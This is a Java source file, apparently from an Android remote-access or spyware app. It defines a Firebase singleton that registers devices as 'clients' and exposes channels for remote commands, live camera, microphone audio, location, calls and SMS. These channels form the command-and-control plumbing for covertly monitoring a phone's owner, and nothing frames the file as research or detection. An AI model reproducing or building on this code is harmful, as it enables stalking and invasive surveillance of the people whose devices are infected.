package com.wains.app.utils;

import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.wains.app.utils.models.Device;

public class FirebaseManager {
    private static final String TAG = "FirebaseManager";
    private static FirebaseManager instance;
    private DatabaseReference databaseReference;

    private FirebaseManager() {
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);
        databaseReference = FirebaseDatabase.getInstance().getReference();
    }

    public static synchronized FirebaseManager getInstance() {
        if (instance == null) {
            instance = new FirebaseManager();
        }
        return instance;
    }

    public void registerDevice(String deviceId) {
        DatabaseReference deviceRef = databaseReference.child("clients").child(deviceId);
        Device device = new Device(deviceId, System.currentTimeMillis(), "online");
        deviceRef.setValue(device)
            .addOnSuccessListener(aVoid -> {
                Log.d(TAG, "Device registered successfully: " + deviceId);
            })
            .addOnFailureListener(e -> {
                Log.e(TAG, "Failed to register device: " + deviceId, e);
            });
    }

    public DatabaseReference getCommandReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("commands");
    }

    public DatabaseReference getLiveCameraReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("live_camera");
    }

    public DatabaseReference getMicReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("audio");
    }

    public DatabaseReference getLocationReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("location");
    }

    public DatabaseReference getCallReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("calls");
    }

    public DatabaseReference getSmsReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("sms");
    }

    public DatabaseReference getWallpaperReference(String deviceId) {
        return databaseReference.child("clients").child(deviceId).child("wallpaper_url");
    }
}
